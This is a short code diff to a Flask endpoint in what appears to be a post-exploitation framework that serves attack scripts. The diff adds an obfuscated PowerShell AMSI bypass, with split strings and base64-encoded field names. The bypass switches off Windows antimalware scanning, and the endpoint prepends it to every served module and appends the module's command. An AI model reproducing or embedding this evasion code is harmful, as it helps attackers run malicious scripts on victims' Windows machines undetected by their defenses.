@@ -341,10 +341,17 @@ def get_script(script_id):
     download script, where id is the index of the available post modules array
     """
     script: ScriptModule = available_post_modules[int(script_id)]
+
+    # prepend amsi bypass
+    amsi_bypass = "[Ref].Assembly.GetType('System.Ma'+'nagement.Automa'+'tion.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAa'+'QBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBt'+'AHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPubl'+'ic,St'+'atic').SetValue($null,$true)"
+
     with open(script.file_path, "r") as f:
         script_string = f.read()
 
-    return (script_string, 200)
+    # append command and return
+    return flask.jsonify({
+        'script': f"{amsi_bypass}; {script_string}; {script.command}"
+    })
 
 @api.route("/api/post/modules", methods=["GET"])
 def get_available_post_modules():
